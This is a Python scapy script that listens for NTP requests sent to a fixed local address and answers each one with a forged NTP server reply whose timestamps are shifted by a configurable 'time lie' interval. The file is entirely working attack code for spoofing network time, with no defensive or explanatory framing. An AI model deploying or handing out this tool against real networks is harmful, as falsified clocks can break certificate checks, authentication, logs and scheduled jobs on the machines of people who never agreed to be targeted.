from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.ntp import NTPHeader
import os
import configparser
import argparse


HOST = '192.168.1.10'


def parse_args():
    parser = argparse.ArgumentParser()
    return parser.parse_args()


def parse_config():
    config = configparser.ConfigParser()

    if not os.path.exists('config.ini'):
        config.add_section('Settings')
        config['Settings']['time_lie_interval'] = '100'

        with open('config.ini', mode='w') as file_config:
            config.write(file_config)
    config.read('config.ini')

    return config


def main():
    def __handle_package(package):
        if package.haslayer(IP) and package[IP].dst == HOST and \
                package.haslayer(NTPHeader):
            layer_NTPHeader = package[NTPHeader]

            send(IP(dst=package[IP].src) / UDP(dport=123) /
                 NTPHeader(leap=layer_NTPHeader.leap,
                           version=layer_NTPHeader.version,
                           mode=4,
                           stratum=layer_NTPHeader.stratum,
                           poll=layer_NTPHeader.poll,
                           precision=layer_NTPHeader.precision,
                           delay=layer_NTPHeader.delay,
                           dispersion=layer_NTPHeader.dispersion,
                           id=layer_NTPHeader.id,
                           ref=layer_NTPHeader.ref,
                           orig=layer_NTPHeader.orig+time_lie_interval,
                           recv=layer_NTPHeader.recv,
                           sent=layer_NTPHeader.sent+time_lie_interval))

    args = parse_args()
    config = parse_config()
    time_lie_interval = int(config['Settings']['time_lie_interval'])
    sniff(filter='udp port 123', store=0, prn=__handle_package)


if __name__ == '__main__':
    main()
